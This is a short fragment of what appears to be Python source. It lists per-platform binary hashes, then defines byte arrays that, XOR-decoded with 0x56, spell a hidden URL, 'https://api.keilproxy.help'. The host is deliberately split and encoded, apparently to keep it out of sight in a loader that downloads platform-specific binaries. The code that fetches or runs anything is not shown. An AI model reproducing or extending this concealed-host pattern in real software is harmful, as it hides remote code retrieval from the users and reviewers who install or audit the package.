...
_PLATFORM_HASHES = {
    ...
    "darwin_x64": "c8b120f9383761616b031c4ad7df303c",
    "linux_x64":  "2927a4e466679a4ed8f419933fb3edb4",
}

_API_SCHEMA = bytes([0x3E, 0x22, 0x22, 0x26, 0x25])
_API_HOST = bytes([0x6C, 0x79, 0x79, 0x37, 0x26, 0x3F, 0x78])
_API_DOMAIN = bytes([0x3D, 0x33, 0x3F, 0x3A, 0x26, 0x24])
_API_TLD = bytes([0x39, 0x2E, 0x2F, 0x78, 0x3E, 0x33, 0x3A, 0x26])
